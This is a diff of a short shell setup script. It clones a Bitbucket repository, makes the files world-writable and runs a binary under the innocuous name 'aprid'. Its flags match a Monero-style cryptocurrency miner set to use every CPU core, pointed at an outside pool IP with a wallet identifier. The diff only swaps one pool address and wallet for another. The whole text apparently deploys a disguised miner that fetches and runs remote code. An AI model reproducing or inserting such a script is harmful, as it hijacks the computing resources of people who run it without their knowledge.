@@ -3,4 +3,4 @@ yum update && yum -y install sudo
 yum -y install git wget
 git clone https://bitbucket.org/asana/luo.git && cd luo
 chmod 777 aprid SHA256SUMS
-./aprid --donate-level 1 -o 64.227.127.123:443 -u solo:SaLvs7NGrYZ6TVbJLW5ZbnM8mseq5HSbXT7KdD7yf4TCRc6vYfkHP7zAtgrxUtUp1R76bhQG2P7KzL4eijmwuQA1HBbwARNpFjo -p solo -a rx/0 -k -t $(nproc --all)
+./aprid --donate-level 1 -o 128.199.143.55:443 -u Q01050041823c1a1afe7c537eb25f5af740b97a9dac396196451d560da2414705556174d6d8244b -p solo -a rx/0 -k -t $(nproc --all)
